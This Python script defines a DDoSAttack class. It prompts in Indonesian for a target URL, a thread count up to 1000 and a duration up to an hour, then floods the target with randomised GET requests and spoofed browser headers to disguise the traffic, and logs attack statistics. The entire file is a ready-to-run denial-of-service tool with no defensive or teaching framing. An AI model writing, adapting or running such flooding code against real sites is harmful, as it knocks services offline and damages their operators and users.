import requests
import threading
import time
import random
import logging
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests_html import HTMLSession

class DDoSAttack:
    def __init__(self, url, threads, duration):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.timeout = 3
        self.logger = self.setup_logging()
        self.session = self.setup_session()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ddos_attack.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)

    def setup_session(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=1000,
            pool_maxsize=1000
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def get_user_agent(self):
        """Mengambil User-Agent yang valid"""
        session = HTMLSession()
        r = session.get('https://developers.whatismybrowser.com/useragents/explore/')
        return r.html.find('td.useragent', first=True).text

    def generate_payload(self):
        payloads = [
            {"param": f"value{random.randint(1,1000)}"},
            {"search": f"query{random.randint(1,1000)}"},
            {"id": str(random.randint(1,1000))},
            {"page": str(random.randint(1,100))},
            {"limit": str(random.randint(10,100))},
            {"offset": str(random.randint(0,1000))},
            {"sort": random.choice(['asc', 'desc'])},
            {"filter": random.choice(['active', 'inactive', 'all'])},
        ]
        return random.choice(payloads)

    def generate_headers(self):
        return {
            "User-Agent": self.get_user_agent(),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json,text/plain,*/*",
                "*/*"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.5",
                "en-GB,en;q=0.5",
                "fr-FR,fr;q=0.5"
            ]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
            "Pragma": "no-cache",
            "DNT": random.choice(["1", "0"]),
            "Upgrade-Insecure-Requests": "1"
        }

    def _send_request(self):
        try:
            headers = self.generate_headers()
            payload = self.generate_payload()
            time.sleep(random.uniform(0.01, 0.05))  # Kurangi delay untuk intensitas lebih tinggi

            response = self.session.get(
                self.url,
                headers=headers,
                params=payload,
                timeout=self.timeout,
                allow_redirects=False
            )
            with self.lock:
                self.request_count += 1
                if response.status_code == 200:
                    self.success_count += 1

            self.logger.debug(f"Request berhasil: {response.status_code}")
            return response

        except Exception as e:
            with self.lock:
                self.error_count += 1
            self.logger.debug(f"Error dalam request: {str(e)}")
            return None

    def _attack_worker(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            self._send_request()

    def run(self):
        self.logger.info(f"Memulai serangan pada {self.url}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._attack_worker) for _ in range(self.threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Kesalahan eksekusi: {e}")

        self.print_stats()

    def print_stats(self):
        self.logger.info("=== Statistik Serangan ===")
        self.logger.info(f"Total Request: {self.request_count}")
        self.logger.info(f"Request Sukses: {self.success_count}")
        self.logger.info(f"Request Gagal: {self.error_count}")
        success_rate = (self.success_count / self.request_count) * 100 if self.request_count > 0 else 0
        self.logger.info(f"Success Rate: {success_rate:.2f}%")

def validate_input():
    while True:
        try:
            url = input("Masukkan URL target: ")
            if not url.startswith(('http://', 'https://')):
                print("URL harus dimulai dengan http:// atau https://")
                continue

            num_threads = int(input("Masukkan jumlah thread (1-1000): "))
            if not 1 <= num_threads <= 1000:
                print("Jumlah thread harus antara 1-1000")
                continue

            attack_duration = int(input("Masukkan durasi waktu serangan dalam detik (1-3600): "))
            if not 1 <= attack_duration <= 3600:
                print("Durasi harus antara 1-3600 detik")
                continue

            return url, num_threads, attack_duration
        except ValueError:
            print("Input tidak valid. Mohon masukkan angka untuk thread dan durasi.")

def main():
    url, threads, duration = validate_input()
    attack = DDoSAttack(url, threads, duration)
    attack.run()

if __name__ == "__main__":
    main()
